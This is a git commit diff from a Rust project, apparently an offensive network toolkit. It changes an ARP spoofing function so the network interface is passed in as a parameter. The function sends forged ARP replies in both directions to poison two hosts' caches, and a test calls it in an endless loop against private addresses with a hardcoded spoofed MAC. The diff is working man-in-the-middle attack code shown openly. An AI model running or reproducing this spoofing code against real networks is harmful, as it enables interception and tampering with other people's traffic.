f840177d70a7e7a2e8ce2dab2d18f2c61fcbca98
Erzbir <erzbir@mail.com>
2024-05-10 14:06:55 +0800

    arp

--- src/proto_attack.rs
+++ src/proto_attack.rs
@@ -13,7 +13,7 @@ mod test {
         loop {
             attack(MacAddr(0x69, 0x3e, 0x5f, 0x52, 0xa0, 0xf9),
                    Ipv4Addr::new(172, 20, 10, 13),
-                   Ipv4Addr::new(172, 20, 10, 1));
+                   Ipv4Addr::new(172, 20, 10, 1), "en0");
         }
     }
 }
--- src/proto_attack/arp/spoof.rs
+++ src/proto_attack/arp/spoof.rs
@@ -6,9 +6,9 @@ use pnet::packet::Packet;
 
 use crate::proto_attack::arp::{Arp, ArpBuilder, Sender};
 
-pub fn attack(spoof_mac: MacAddr, spoof_ip: Ipv4Addr, target_ip: Ipv4Addr) {
+pub fn attack(spoof_mac: MacAddr, spoof_ip: Ipv4Addr, target_ip: Ipv4Addr, inter_name: &str) {
     let arp_a = Arp::broadcast(spoof_mac, spoof_ip, target_ip, ArpOperations::Reply);
     let arp_b = Arp::broadcast(spoof_mac, target_ip, spoof_ip, ArpOperations::Reply);
-    arp_a.send("en0");
-    arp_b.send("en0");
+    arp_a.send(inter_name);
+    arp_b.send(inter_name);
 }
